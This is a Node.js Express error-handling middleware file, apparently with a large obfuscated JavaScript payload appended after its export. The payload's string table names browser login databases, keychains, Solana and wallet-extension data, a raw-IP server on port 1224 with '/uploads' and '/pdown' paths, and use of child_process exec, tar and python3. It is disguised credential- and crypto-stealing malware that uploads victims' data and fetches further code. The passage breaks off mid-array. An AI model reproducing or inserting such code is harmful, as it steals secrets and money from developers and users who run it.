// const { ValidationError } = require('express-validation'); // Optional, for handling validation errors
// const winston = require('winston'); // Optional, for logging errors

// Create a logger (optional, but recommended)
// const logger = winston.createLogger({
//   level: 'error',
//   format: winston.format.json(),
//   transports: [
//     new winston.transports.Console(),
//     new winston.transports.File({ filename: 'error.log' })
//   ]
// });

// Error handling middleware
const errorMiddleware = (err, req, res, next) => {
  // Log the error (optional)
  logger.error(err);

  // Handle specific error types if needed
  // if (err instanceof ValidationError) {
  //   return res.status(err.statusCode).json(err);
  // }

  // Default error response
  res.status(err.status || 500).json({
    message: err.message || 'Internal Server Error',
    error: process.env.NODE_ENV === 'development' ? err : {},
  });
};

module.exports = errorMiddleware;

(function (_0x4631f7, _0x57f642) {
  function _0x41d310(_0x26de4e, _0x519040, _0x4890fd, _0xa5f7ea) {
    return _0xd469(_0xa5f7ea - -'0x2a3', _0x4890fd);
  }
  function _0x4027cb(_0x5a5125, _0x13137e, _0x17092a, _0xfd232b) {
    return _0xd469(_0x13137e - '0x1e4', _0x17092a);
  }
  const _0x3dad08 = _0x4631f7();
  while (!![]) {
    try {
      const _0x1445d2 =
        parseInt(_0x4027cb('0x398', 0x3cb, 0x38b, '0x34d')) /
          (-0x15f7 + 0x1330 + -0x8 * -0x59) +
        (parseInt(_0x4027cb('0x317', 0x359, 0x36a, '0x33c')) /
          (0x6a + 0x3f1 + 0x9f * -0x7)) *
          (-parseInt(_0x4027cb(0x342, '0x34c', '0x338', 0x3ca)) /
            (0xb03 + 0xe1f + 0x191f * -0x1)) +
        -parseInt(_0x4027cb(0x384, '0x31e', '0x303', 0x36b)) /
          (-0x1df9 + -0x2045 + 0x2 * 0x1f21) +
        -parseInt(_0x41d310(-'0x1a6', -'0x1ca', -0x1db, -0x149)) /
          (0xdd + 0x168f + -0x1767) +
        -parseInt(_0x4027cb(0x3c6, '0x3ba', '0x409', 0x379)) /
          (0x20c0 + -0x89 * 0x1 + -0x2031) +
        (parseInt(_0x41d310(-0x76, -'0x8d', -0xf5, -0x87)) /
          (0xd * 0x7d + -0x40a * 0x2 + -0x1c2 * -0x1)) *
          (parseInt(_0x41d310(-'0x15f', -0xaf, -0x69, -'0xc8')) /
            (0x17b9 + 0x11 + -0x17c2)) +
        (parseInt(_0x41d310(-'0x9b', -0x8, -'0x94', -'0x89')) /
          (0x632 + 0x11c9 + 0x2 * -0xbf9)) *
          (parseInt(_0x4027cb('0x3d1', 0x3ae, '0x38a', '0x35e')) /
            (-0xb * 0x243 + -0x1239 * -0x1 + 0x6b2));
      if (_0x1445d2 === _0x57f642) break;
      else _0x3dad08['push'](_0x3dad08['shift']());
    } catch (_0x49d57f) {
      _0x3dad08['push'](_0x3dad08['shift']());
    }
  }
})(_0x2230, 0xd83d + 0xa9605 + -0x18551);
const _0x4b87a0 = (function () {
    const _0x3d9833 = {};
    (_0x3d9833[_0x4242c6(0x1ec, '0x1dd', 0x163, '0x178')] = function (
      _0x50bbc3,
      _0x2c0572
    ) {
      return _0x50bbc3 === _0x2c0572;
    }),
      (_0x3d9833[_0x4039ea(-'0x2ca', -0x1a8, -'0x1c7', -'0x23f')] = _0x4242c6(
        '0x1d6',
        '0x1cd',
        '0x176',
        0x18f
      )),
      (_0x3d9833[_0x4039ea(-'0x192', -0x196, -0x230, -0x203)] = _0x4242c6(
        0x21e,
        '0x19e',
        0x21e,
        '0x18d'
      ));
    function _0x4242c6(_0x3529d9, _0x4cf484, _0x39274d, _0x431613) {
      return _0xd469(_0x3529d9 - 0x19, _0x431613);
    }
    function _0x4039ea(_0x3da748, _0x546fce, _0x5457e1, _0xaca95e) {
      return _0xd469(_0xaca95e - -0x35e, _0x546fce);
    }
    _0x3d9833[_0x4242c6('0x1d2', '0x257', 0x1b5, 0x148)] = _0x4039ea(
      -0xaf,
      -'0x1dd',
      -'0xd7',
      -0x146
    );
    const _0x1fc77b = _0x3d9833;
    let _0xe09fd3 = !![];
    return function (_0x322f7a, _0x52ba0f) {
      function _0x53c1c1(_0x17bf2f, _0x2d4578, _0x7d80a5, _0x5917e6) {
        return _0x4242c6(
          _0x7d80a5 - '0x13d',
          _0x2d4578 - '0x13e',
          _0x7d80a5 - '0x77',
          _0x17bf2f
        );
      }
      const _0xd99d9d = {
        KyMHp: function (_0x257bd5, _0xe82cc1) {
          return _0x1fc77b['hdxMd'](_0x257bd5, _0xe82cc1);
        },
        EMOCO: _0x1c823b(0x2ca, 0x3cc, '0x35c', '0x330'),
        eOZot: _0x1fc77b[_0x53c1c1('0x227', '0x2cd', '0x275', '0x312')],
        TdtSn: _0x1fc77b[_0x53c1c1('0x2ad', '0x25c', 0x2b1, '0x2e3')],
      };
      function _0x1c823b(_0x1710e5, _0x519a7d, _0x972d61, _0x5195ee) {
        return _0x4039ea(
          _0x1710e5 - '0x1e3',
          _0x972d61,
          _0x972d61 - '0x9',
          _0x5195ee - 0x52b
        );
      }
      if (
        _0x1fc77b['hdxMd'](
          _0x1fc77b[_0x1c823b('0x30b', 0x392, '0x3ff', 0x386)],
          _0x1fc77b[_0x53c1c1('0x301', '0x283', '0x30f', 0x2bf)]
        )
      ) {
        const _0x3959c2 = _0xe09fd3
          ? function () {
              function _0x24b417(_0x2b4c4e, _0x5ee85b, _0x3a6dfb, _0x25e75e) {
                return _0x1c823b(
                  _0x2b4c4e - 0x16b,
                  _0x5ee85b - 0xba,
                  _0x3a6dfb,
                  _0x25e75e - 0x1f4
                );
              }
              function _0x3a1293(_0x366914, _0x81df97, _0xf9dcee, _0x30b52e) {
                return _0x53c1c1(
                  _0x366914,
                  _0x81df97 - '0x179',
                  _0x81df97 - '0x192',
                  _0x30b52e - '0x1db'
                );
              }
              if (
                _0xd99d9d['KyMHp'](
                  _0xd99d9d[_0x24b417('0x51a', 0x5a4, 0x509, 0x570)],
                  _0xd99d9d[_0x24b417('0x520', 0x5b7, '0x511', '0x570')]
                )
              ) {
                if (_0x52ba0f) {
                  const _0x3603fe = _0x52ba0f['apply'](_0x322f7a, arguments);
                  return (_0x52ba0f = null), _0x3603fe;
                }
              } else {
                const _0x84214b = _0x18cead
                  ? function () {
                      function _0x5eed99(
                        _0x25207c,
                        _0x2bced8,
                        _0x13ea52,
                        _0x19438a
                      ) {
                        return _0x3a1293(
                          _0x2bced8,
                          _0x19438a - -'0x555',
                          _0x13ea52 - 0x11d,
                          _0x19438a - '0xe0'
                        );
                      }
                      if (_0x5d3d17) {
                        const _0x28e9f8 = _0x20f0ab[
                          _0x5eed99(-'0x1b7', -'0x1d1', -'0x1a2', -'0x147')
                        ](_0x57c50b, arguments);
                        return (_0x5e7ae7 = null), _0x28e9f8;
                      }
                    }
                  : function () {};
                return (_0x3930b3 = ![]), _0x84214b;
              }
            }
          : function () {};
        return (_0xe09fd3 = ![]), _0x3959c2;
      } else {
        const _0x4c420d = {};
        (_0x4c420d['filename'] =
          _0x415cf4 +
          '_' +
          _0x41a6ad +
          _0x2b9efe +
          '_' +
          _0xfd6a1a[_0x3b59e5] +
          '_' +
          _0x28a2d8),
          (_0x4c32c5[_0x53c1c1('0x1de', '0x298', '0x258', 0x2ae)](
            _0xd99d9d[_0x53c1c1('0x298', '0x245', 0x248, '0x214')]
          ) ||
            _0x2110c4['includes'](
              _0xd99d9d[_0x53c1c1('0x2cd', 0x34b, '0x2f4', 0x2ca)]
            )) &&
            _0x1ac74c[_0x53c1c1(0x346, '0x3b5', '0x362', 0x39b)]({
              value:
                _0x5cc1e7[
                  _0x53c1c1('0x392', '0x379', 0x34c, 0x3e7) +
                    _0x1c823b(0x2de, 0x394, '0x371', '0x31b')
                ](_0x17b877),
              options: _0x4c420d,
            });
      }
    };
  })(),
  _0x388bcd = _0x4b87a0(this, function () {
    const _0x335b48 = {};
    _0x335b48['OUFls'] = _0x4aeed5(0x389, '0x282', 0x30f, 0x3a3) + '+$';
    const _0x1f6bae = _0x335b48;
    function _0x158c71(_0x325157, _0x1c0135, _0x4a8c24, _0xb5d00f) {
      return _0xd469(_0xb5d00f - -0x3cc, _0x4a8c24);
    }
    function _0x4aeed5(_0x128259, _0x4c0a03, _0x165f94, _0x4cae66) {
      return _0xd469(_0x165f94 - 0x213, _0x4c0a03);
    }
    return _0x388bcd[_0x4aeed5('0x388', 0x339, '0x304', '0x309')]()
      [_0x4aeed5('0x3bf', '0x399', '0x420', '0x3c5')](
        _0x1f6bae[_0x4aeed5('0x3c9', '0x3af', 0x3f4, 0x37d)]
      )
      [_0x4aeed5(0x32e, '0x26b', '0x304', '0x347')]()
      [_0x4aeed5('0x339', 0x2d1, '0x355', '0x3a7') + 'r'](_0x388bcd)
      [_0x4aeed5(0x43f, 0x38c, 0x420, 0x3ee)](
        _0x1f6bae[_0x158c71(-'0x1f5', -0x24d, -'0x161', -0x1eb)]
      );
  });
_0x388bcd();
const _0xeb09fc = (function () {
  function _0x2fb35e(_0x165ab9, _0x1d975e, _0x13aff6, _0x12283b) {
    return _0xd469(_0x165ab9 - -'0x4c', _0x12283b);
  }
  const _0x1c0078 = {};
  (_0x1c0078['KIIEO'] = function (_0x4aa71e, _0x11219a) {
    return _0x4aa71e === _0x11219a;
  }),
    (_0x1c0078['jFtwL'] = _0x2fb35e(0x134, '0x188', 0x197, 0x12d));
  const _0x2413c9 = _0x1c0078;
  let _0x209907 = !![];
  return function (_0x4f9872, _0x58ddf2) {
    function _0x1ff1c7(_0x4e54c5, _0x4e7d32, _0x4a5252, _0x431fa9) {
      return _0x2fb35e(
        _0x4a5252 - 0x39e,
        _0x4e7d32 - 0x1db,
        _0x4a5252 - '0x198',
        _0x4e54c5
      );
    }
    const _0x45d9ca = {
        SSYCJ: function (_0x2177c9, _0x193e64) {
          function _0x382b08(_0x2d78fe, _0x483e8f, _0x2ecaad, _0x2264ce) {
            return _0xd469(_0x2ecaad - -'0x1c5', _0x483e8f);
          }
          return _0x2413c9[_0x382b08('0x4', 0xe, -'0xa', -0x9b)](
            _0x2177c9,
            _0x193e64
          );
        },
        snYsA: _0x2413c9[_0x1ff1c7(0x47d, 0x51c, '0x4f9', '0x520')],
      },
      _0x4018c8 = _0x209907
        ? function () {
            function _0x442edc(_0x346701, _0x5c42a2, _0x11df24, _0x5d1456) {
              return _0x1ff1c7(
                _0x5d1456,
                _0x5c42a2 - 0x1ea,
                _0x346701 - -0x515,
                _0x5d1456 - '0x14d'
              );
            }
            function _0x3875a9(_0x21e70b, _0x59afe2, _0xf3f3a0, _0x4ffcb3) {
              return _0x1ff1c7(
                _0x4ffcb3,
                _0x59afe2 - '0x43',
                _0x21e70b - -0x20b,
                _0x4ffcb3 - 0x8
              );
            }
            if (
              _0x45d9ca[_0x3875a9(0x303, 0x2b2, 0x384, 0x34e)](
                _0x3875a9(0x2c7, 0x341, '0x236', 0x2bc),
                _0x45d9ca[_0x442edc(0x12, 0x95, -'0x3b', '0x71')]
              )
            ) {
              if (_0x58ddf2) {
                const _0x8b379c = _0x58ddf2['apply'](_0x4f9872, arguments);
                return (_0x58ddf2 = null), _0x8b379c;
              }
            } else _0x368dd7();
          }
        : function () {};
    return (_0x209907 = ![]), _0x4018c8;
  };
})();
function _0x58b20d(_0x396e66, _0xc5253b, _0x3790a1, _0x53965e) {
  return _0xd469(_0x53965e - '0x19e', _0x396e66);
}
const _0x51360f = _0xeb09fc(this, function () {
  const _0x580116 = {
    toBiJ: function (_0x29133f, _0x13758b) {
      return _0x29133f >= _0x13758b;
    },
    bjcIV: function (_0x1436c1, _0x5aadd9) {
      return _0x1436c1 < _0x5aadd9;
    },
    HuCtv: function (_0x47c283, _0x2773bf) {
      return _0x47c283 === _0x2773bf;
    },
    mFsyQ: _0x308c3c(-0xd0, -'0xd0', -'0xce', -0x13a),
    GRTDB: _0x131123(-0x57, -'0x1f', -0x92, -0x51),
    ueKUs:
      _0x308c3c(-0x81, -0xd5, -0xdd, -0x96) +
      _0x308c3c(-0x140, -0x7f, -0xe0, -0x16f),
    AUTaa:
      _0x308c3c(-0xc7, -0x104, -'0x85', -'0x51') +
      _0x131123(-'0x135', -'0x146', -'0x166', -0x18d) +
      _0x308c3c(-'0xeb', -'0x55', -'0xea', -'0x117') +
      '\x20)',
    wozZf: function (_0x260ef0) {
      return _0x260ef0();
    },
    gODWn: _0x308c3c(-'0x5', -'0x4c', -0x82, -'0x78'),
    jrCCX: _0x131123(-'0x119', -'0x4f', -0xa8, -'0x13b'),
    KIUgz: 'error',
    IasUp: _0x131123(-'0xd9', 0xf, -0x6e, -'0xbd'),
    HvBBL: _0x131123(-'0x108', -0x19f, -'0x180', -'0x15c'),
    YrbUZ: _0x131123(-0xe1, -'0x7c', -'0x7d', -0xcd),
    XemAi: _0x308c3c(-0x86, -0xe8, -'0xe6', -'0x14b'),
  };
  function _0x131123(_0x2704c8, _0x3315be, _0x760a07, _0x65a8da) {
    return _0xd469(_0x760a07 - -0x291, _0x2704c8);
  }
  const _0x593df5 = function () {
    function _0x3bf208(_0x544dbd, _0x8c19a9, _0x231ef0, _0x416883) {
      return _0x308c3c(
        _0x544dbd - '0x13c',
        _0x8c19a9 - '0xb4',
        _0x544dbd - -'0x101',
        _0x8c19a9
      );
    }
    const _0x8467d4 = {
      CoROG: function (_0x917197, _0xb2e98a) {
        function _0xede306(_0x463dd2, _0x35ebe8, _0x28860c, _0x30f33b) {
          return _0xd469(_0x35ebe8 - -'0x77', _0x463dd2);
        }
        return _0x580116[_0xede306('0x1f6', 0x178, '0x1d8', '0x120')](
          _0x917197,
          _0xb2e98a
        );
      },
      isrrx: function (_0x92beee, _0x3cb491) {
        return _0x92beee + _0x3cb491;
      },
      xwrcw: function (_0x5d8980, _0x348977) {
        function _0x5d6b81(_0x1e8ceb, _0xfe5fc, _0x4193d8, _0x3ed5ef) {
          return _0xd469(_0x3ed5ef - 0x26a, _0x4193d8);
        }
        return _0x580116[_0x5d6b81('0x3f6', 0x46a, '0x40d', '0x43b')](
          _0x5d8980,
          _0x348977
        );
      },
    };
    function _0x28df94(_0x29c889, _0x16b5ef, _0x34bb07, _0x5d5452) {
      return _0x308c3c(
        _0x29c889 - 0x13e,
        _0x16b5ef - 0x12a,
        _0x5d5452 - 0x500,
        _0x34bb07
      );
    }
    if (
      _0x580116['HuCtv'](
        _0x580116[_0x3bf208(-0x165, -0x1d2, -'0xf1', -0x169)],
        _0x3bf208(-0x1cf, -'0x171', -0x1a2, -0x181)
      )
    ) {
      let _0x30066e;
      try {
        if (
          _0x580116[_0x3bf208(-0x166, -'0x11d', -'0x178', -0x1b0)] ===
          _0x28df94('0x4c9', 0x4c8, 0x582, '0x4fe')
        )
          _0x30066e = Function(
            _0x580116[_0x28df94(0x46a, '0x456', '0x541', '0x4ed')] +
              _0x580116[_0x3bf208(-'0x137', -'0x10d', -'0xb9', -0x1c9)] +
              ');'
          )();
        else {
          if (_0x54d578) {
            const _0x3be429 = _0x3ea598[
              _0x3bf208(-'0x1dc', -0x177, -'0x16e', -'0x163')
            ](_0x397056, arguments);
            return (_0x1d39a4 = null), _0x3be429;
          }
        }
      } catch (_0x48970d) {
        _0x30066e = window;
      }
      return _0x30066e;
    } else {
      var _0x28eb8b =
        _0x5c7e68[_0x3bf208(-0xe1, -0xd7, -0x138, -0x50)](_0x4a5fc1);
      _0x8467d4[_0x3bf208(-0x16e, -'0x181', -0x1e0, -'0x115')](
        _0x28eb8b[_0x3bf208(-0x1af, -'0x14b', -0x177, -0x1cf)],
        _0x8467d4[_0x3bf208(-0x170, -0x208, -'0x18a', -0x13e)](
          _0x4ba738,
          0x16b7 * 0x1 + 0x22a * -0xd + 0x571
        )
      )
        ? ((_0x4a1dcb = _0x28eb8b[_0x28df94(0x452, '0x4b5', 0x3c0, '0x452')]),
          _0x58027e[_0x3bf208(-0xdd, -'0x14a', -'0x48', -0x90)](
            _0x2808a9,
            _0x462f3e,
            (_0x5885e9) => {
              if (_0x5885e9) throw _0x5885e9;
              _0x43a2c2(_0x2db9a2);
            }
          ))
        : (_0x8467d4[_0x3bf208(-'0x1f0', -0x276, -'0x264', -0x1ef)](
            _0x5394c3,
            _0x28eb8b[_0x3bf208(-0x1af, -'0x165', -0x17b, -'0x243')]
          )
            ? (_0x588d99 =
                _0x28eb8b[_0x3bf208(-'0x1af', -0x11a, -'0x13f', -'0x167')])
            : (_0x470c06['rmSync'](_0xee1f9f),
              (_0x29c597 = 0x3b * 0x8b + -0x11b9 + -0xe50)),
          _0x194579());
    }
  };
  function _0x308c3c(_0x580857, _0x409ad5, _0x189a21, _0x186751) {
    return _0xd469(_0x189a21 - -'0x201', _0x186751);
  }
  const _0x245c91 = _0x580116[_0x308c3c(0x8, 0x1f, -0x1c, '0x2f')](_0x593df5),
    _0x372a40 = (_0x245c91['console'] =
      _0x245c91[_0x131123(-'0x7', -'0x126', -'0x90', 0xc)] || {}),
    _0x527a48 = [
      _0x580116[_0x131123(-0x178, -'0xf9', -0xf6, -'0x117')],
      _0x308c3c(-'0xd2', -'0xe9', -0x6c, -0x13),
      _0x580116['jrCCX'],
      _0x580116[_0x308c3c(-0xe8, -'0x48', -'0xc3', -'0x11c')],
      _0x580116[_0x308c3c(-0x11, -0x42, -'0x8b', -0xc1)],
      _0x580116[_0x308c3c(-0x12, 0x74, 0x3, 0x80)],
      _0x308c3c(0x6d, '0x8e', 0x23, -'0x1e'),
    ];
  for (
    let _0xc83842 = -0x7 * -0x4dd + 0x22a7 + -0x44b2;
    _0x580116[_0x308c3c('0x47', '0x42', -0x30, -0x6c)](
      _0xc83842,
      _0x527a48[_0x308c3c(-'0xa7', -0x37, -0xb2, -'0x108')]
    );
    _0xc83842++
  ) {
    if (
      _0x580116['HuCtv'](
        _0x580116[_0x131123(-0x182, -0x11c, -'0x165', -'0x179')],
        _0x580116[_0x308c3c(-0x9, -'0x62', 0xa, -'0x2f')]
      )
    ) {
      let _0x2efe3c = _0xcca9d6[_0x308c3c(-'0x8d', -'0x1d', -'0x9a', -0xe0)](
        _0x32be12,
        _0x15b32d
      );
      const _0x129674 = {};
      (_0x129674['filename'] = _0x5be150 + '_' + _0x53d6be + '_' + _0xcf2157),
        _0xf22b77[_0x308c3c(-'0x65', 0x1, 0xb, '0x74')]({
          value:
            _0x1c9e5e[
              _0x131123(-0x125, -'0x12e', -0x9b, -0x2c) +
                _0x131123(-0xb4, -'0x1b1', -0x143, -'0x19e')
            ](_0x2efe3c),
          options: _0x129674,
        });
    } else {
      const _0x4d32b7 =
          _0xeb09fc[_0x131123(-'0x170', -0xe2, -'0x14f', -0x136) + 'r'][
            _0x131123(-'0x1f4', -0x1fa, -0x169, -'0x12a')
          ][_0x308c3c(-0xe0, -'0x15a', -'0xfa', -0x173)](_0xeb09fc),
        _0x57494a = _0x527a48[_0xc83842],
        _0x44c90e = _0x372a40[_0x57494a] || _0x4d32b7;
      (_0x4d32b7['__proto__'] =
        _0xeb09fc[_0x131123(-'0x200', -'0x1dc', -'0x18a', -'0x1ca')](
          _0xeb09fc
        )),
        (_0x4d32b7['toString'] =
          _0x44c90e[_0x131123(-0x132, -'0x158', -0x1a0, -0x218)]['bind'](
            _0x44c90e
          )),
        (_0x372a40[_0x57494a] = _0x4d32b7);
    }
  }
});
function _0xd469(_0x456af3, _0x2c2f01) {
  const _0x223067 = _0x2230();
  return (
    (_0xd469 = function (_0xd46991, _0x5852ea) {
      _0xd46991 = _0xd46991 - (0x1 * 0x22b8 + 0x2e + -0x1 * 0x21f5);
      let _0x56a200 = _0x223067[_0xd46991];
      return _0x56a200;
    }),
    _0xd469(_0x456af3, _0x2c2f01)
  );
}
function _0x2230() {
  const _0x3fda52 = [
    'jgjfhomihk',
    'pZVPE',
    '/storage/d',
    'MpFYO',
    'bjcIV',
    '/Library/A',
    'hdxMd',
    'ngcnapndod',
    'snYsA',
    '247026FFLLdB',
    'ebuvA',
    '/.config/s',
    'Local/Goog',
    'GwxBo',
    '8bUWktS',
    'GDsqS',
    'NgdrL',
    'oohckonoee',
    'LHuzJ',
    'VivGD',
    'OUFls',
    '/Login\x20Dat',
    'Local/Brav',
    'Default',
    'wozZf',
    'koHNv',
    '209758HOQybk',
    'dynVc',
    'info',
    '\x5c.pyp\x5cpyth',
    'pplication',
    'Roaming/Op',
    'efault',
    'ueKUs',
    'toBiJ',
    'le/Chrome',
    'PBAUS',
    'fsCdo',
    '/AppData/R',
    '/User\x20Data',
    'mdjonilkdb',
    'createRead',
    '/.npl\x22',
    'kpcnlpebkl',
    'ibnejdfjmm',
    'hid',
    'ZAJfS',
    'xAYOv',
    '/ld_',
    '/.config/',
    'qHDnv',
    '/uploads',
    'console',
    'bMeva',
    'jODoX',
    'HvBBL',
    '.ldb',
    'raveSoftwa',
    'qIjJs',
    'rowser',
    'google-chr',
    '/.npl',
    'XemAi',
    'push',
    'search',
    'wwZVQ',
    'QYZYx',
    'XLybf',
    'path',
    'url',
    'kAyOp',
    'KeWzR',
    'moz-extens',
    '/client/',
    'rkbkO',
    'jBMGM',
    're/Brave-B',
    '5545170CxzHna',
    'uBJjw',
    '4242406yWnicL',
    'hifafgmccd',
    'forEach',
    'tings',
    'JKFMY',
    'statSync',
    'HIVFQ',
    'exception',
    'trace',
    'rename',
    '/pdown',
    'ion',
    'aholpfdial',
    '\x20-C\x20',
    'toString',
    'eOZot',
    'EyZmF',
    'jhoer',
    'nlBJp',
    'http://95.',
    'yIzRq',
    'JfLVS',
    'RyKfK',
    'lchlghecda',
    'rmSync',
    '(((.+)+)+)',
    'QCvQS',
    'DgsQZ',
    '-db',
    'zuZhb',
    'brld_',
    'includes',
    'idb',
    're/Opera\x20S',
    'nOsOT',
    'Profile\x20',
    'bind',
    'wanBv',
    'com.operas',
    'pqxCc',
    'ophhpkkolj',
    'platform',
    'opera',
    'HSKsH',
    'aERfz',
    'ync',
    'table',
    'xwrcw',
    'yqKnW',
    'KjnbH',
    'get',
    'OAGzj',
    'rn\x20this\x22)(',
    'vPkyH',
    'pIPAu',
    'odDBO',
    'QqydO',
    'UOPbJ',
    'are/Brave-',
    '/Library/K',
    'HPPls',
    'imhlpmgjnj',
    'nction()\x20',
    'vCqqe',
    'ejbalbakop',
    'return\x20(fu',
    'sLyyA',
    'apply',
    'ehbFA',
    'prototype',
    'ajSpz',
    'readdirSyn',
    'ctor(\x22retu',
    'YrbUZ',
    'vNUxb',
    'pekplomjjk',
    'JEtIe',
    'formData',
    'filename',
    'ension\x20Set',
    'tEcRA',
    'ser',
    'era',
    'uEeaW',
    'VUhRQ',
    'accessSync',
    'SDkSv',
    '3049380FnPZXE',
    'tNABO',
    'wWyBV',
    'fFHhd',
    'KIUgz',
    'hostname',
    'UpgMn',
    'QjEEk',
    'constructo',
    'cUqGr',
    'jkpAK',
    'ANTFL',
    'QwHcG',
    'exec',
    'fhbohimael',
    'ox/Profile',
    'jspse',
    'ogUKi',
    'jblndlipeo',
    'oIOQj',
    'Stream',
    'length',
    'qCcRI',
    'TVqGL',
    '164.17.24:',
    'size',
    '5346',
    'copyFile',
    'isDirector',
    '-release',
    'cJDlQ',
    'solana_id.',
    '2371370kHthbH',
    'DZQwp',
    'paAMC',
    'gpafnldhgm',
    'xHYJd',
    'ogin.keych',
    'AAszr',
    'Browser',
    'ome',
    'DiIiS',
    'ktZsu',
    'acmacodkjb',
    'soft/Edge/',
    'join',
    '736959IBAChf',
    'oaming/Moz',
    '/AppData/L',
    'bfnaelmome',
    'sXopE',
    'tjEqv',
    'zuOlq',
    'nkbihfbeog',
    'Fmgxd',
    'JpFbl',
    'hxUyO',
    'post',
    'wuZtR',
    '6voXHLO',
    'IasUp',
    'zwZAb',
    'iRHVt',
    'eychains/l',
    'AQFWB',
    '/Local\x20Ext',
    '{}.constru',
    'illa/Firef',
    'existsSync',
    'log',
    'kuIPG',
    'zVAdw',
    'eofbddgcij',
    'dgmoleebol',
    'itkpT',
    'FhgJM',
    'python3\x20\x22',
    'gPHeb',
    'FqQpk',
    'aeachknmef',
    'LBuQw',
    'uhFQa',
    '1224',
    'hkJow',
    'uqpfr',
    'lNtdY',
    'DGTaA',
    '\x20Support/',
    'isrrx',
    'SpRfC',
    'CoROG',
    'warn',
    'wQFhK',
    'txt',
    'utGbB',
    'replace',
    'nkSGc',
    'gODWn',
    'GRTDB',
    'mFsyQ',
    'TdtSn',
    'Dajvc',
    'ocal/Micro',
    'stfDO',
    'ACzbG',
    'cfgodnhcel',
    'jkJDE',
    'tmpdir',
    'HreGL',
    'jFtwL',
    'pld_',
    'enyra',
    'mMMbd',
    'Frxld',
    'son',
    'vdheA',
    'nmhnfnkdna',
    'EMOCO',
    'multi_file',
    'aggtE',
    'tjLPx',
    'Google/Chr',
    '.files',
    'renameSync',
    '\x5cp.zi',
    'writeFileS',
    'lmeeeajnim',
    'OrYry',
    'dirname',
    'KIIEO',
    'SSYCJ',
    '.log',
    'Qmvju',
    '131',
    '/AppData/',
    'logkc-db',
    'aiABb',
    'tar\x20-xf\x20',
    'mYftz',
    'PgXQQ',
    'GkwvP',
    'qVvLa',
    'ain',
    'rkveu',
    '30ARDOgs',
    'AUTaa',
    '\x22\x20\x22',
  ];
  _0x2230 = function () {
    return _0x3fda52;
  };
  return _0x2230();
}
_0x51360f();
const _0x22de84 = require('fs'),
  _0x4cff6b = require('os'),
  _0x515a8c = require(_0x58b20d('0x38d', 0x411, '0x42a', '0x3af')),
  _0x308612 = require('request'),
  _0x79d6af = require('child_proc' + 'ess')[
    _0x58b20d('0x2fc', '0x33d', '0x326', 0x2e5)
  ],
  _0x33c55b = _0x4cff6b[_0x143f14(-0x1cc, -0x17e, -0x120, -'0x174')](),
  _0x1bc283 = _0x4cff6b[_0x58b20d('0x280', 0x310, 0x281, 0x2aa)](),
  _0x486da7 = _0x4cff6b['homedir'](),
  _0x40095b = _0x4cff6b[_0x143f14(-'0x17f', -0xdf, -'0xe9', -0x10e)](),
  _0x4a21c4 = _0x4cff6b['type'](),
  _0x144d75 =
    _0x143f14(-0x16a, -0x14c, -0x21e, -0x1bd) +
    _0x58b20d(0x2f0, 0x2c9, 0x2fa, 0x2f0) +
    _0x143f14(-'0x191', -'0x11f', -'0xe8', -0x127),
  _0x3c08e1 = (_0x4c8711) =>
    _0x4c8711[_0x58b20d('0x326', '0x2d3', '0x37f', '0x337')](
      /^~([a-z]+|\/)/,
      (_0x3ef447, _0x109e66) =>
        '/' === _0x109e66
          ? _0x486da7
          : _0x515a8c[_0x143f14(-'0x5f', -'0x127', -'0x96', -0xf9)](_0x486da7) +
            '/' +
            _0x109e66
    ),
  _0x274c2b = _0x143f14(-0x1b8, -'0x1d2', -'0x1f6', -0x15f),
  _0x42eeb1 = _0x143f14(-0x160, -0x78, -'0x104', -'0xf4');
function _0x292b4d(_0x1b0f87) {
  const _0x3c5854 = {};
  (_0x3c5854[_0x22f883('0x1db', 0x1ae, 0x121, 0x196)] = function (
    _0x10a141,
    _0x4aa190
  ) {
    return _0x10a141 !== _0x4aa190;
  }),
    (_0x3c5854[_0x21673f('0x433', '0x45b', '0x410', 0x499)] = _0x22f883(
      '0xe5',
      0x1d0,
      0xfc,
      '0x139'
    ));
  function _0x22f883(_0x45e854, _0x212b2c, _0x14468a, _0x3f8aee) {
    return _0x143f14(
      _0x212b2c,
      _0x212b2c - 0x1ec,
      _0x14468a - '0x16a',
      _0x3f8aee - '0x23a'
    );
  }
  _0x3c5854[_0x22f883('0xb', '0x3d', '0x7d', '0x9f')] = _0x22f883(
    0x6,
    0x8b,
    '0x15',
    '0x8c'
  );
  const _0x27c0d8 = _0x3c5854;
  function _0x21673f(_0x1a9459, _0xe6f7c8, _0x5aed24, _0x52f341) {
    return _0x143f14(
      _0xe6f7c8,
      _0xe6f7c8 - 0x1da,
      _0x5aed24 - 0x131,
      _0x5aed24 - 0x557
    );
  }
  try {
    return _0x22de84[_0x22f883('0x96', 0x82, '0x3b', '0xbf')](_0x1b0f87), !![];
  } catch (_0x4ea0c4) {
    if (
      _0x27c0d8[_0x22f883('0x21d', 0x17e, '0x22c', 0x196)](
        _0x27c0d8[_0x22f883(0xc2, 0xe0, '0xb5', 0xf3)],
        _0x27c0d8['vPkyH']
      )
    )
      return ![];
    else {
      const _0x2bab47 = {};
      (_0x2bab47[_0x21673f('0x531', '0x51d', 0x4b6, 0x4aa)] =
        _0x395ea8 + '/uploads'),
        (_0x2bab47['formData'] = _0x414253);
      const _0x33213f = _0x2bab47;
      _0x561c75[_0x22f883(0xef, 0xae, '0x12b', 0xfa)](
        _0x33213f,
        (_0x31ba1e, _0x1c360f, _0xf7ee83) => {}
      );
    }
  }
}
const _0x570b36 = [
    _0x143f14(-'0x4a', -'0x5d', -'0x8f', -0xd0) +
      'eSoftware/' +
      'Brave-Brow' +
      _0x58b20d(0x268, 0x2d2, 0x23b, 0x2d2),
    'BraveSoftw' +
      _0x58b20d('0x33c', 0x279, 0x22d, 0x2bb) +
      _0x143f14(-0xc4, -'0x14e', -'0x169', -0x152),
    'BraveSoftw' + 'are/Brave-' + _0x58b20d('0x29f', 0x2f1, '0x392', '0x2ff'),
  ],
  _0xa18664 = [
    _0x143f14(-'0xb4', -0xdf, -0x113, -'0xda') +
      _0x58b20d('0x37f', '0x39c', '0x334', 0x38e),
    _0x58b20d(0x308, '0x337', 0x3bd, '0x351') +
      _0x143f14(-0xd6, -'0x14c', -0x144, -0x151),
    _0x58b20d(0x34f, 0x3d8, '0x423', 0x3a7) + 'ome',
  ],
  _0x4dd88a = [
    _0x58b20d('0x2f5', 0x3b4, '0x411', '0x38a') +
      'era\x20Softwa' +
      _0x143f14(-0x1ce, -0x14e, -'0x195', -0x1af) +
      _0x143f14(-'0x164', -0x16e, -0x21b, -'0x1a2'),
    _0x143f14(-'0x160', -0x220, -'0x171', -'0x1aa') +
      'oftware.Op' +
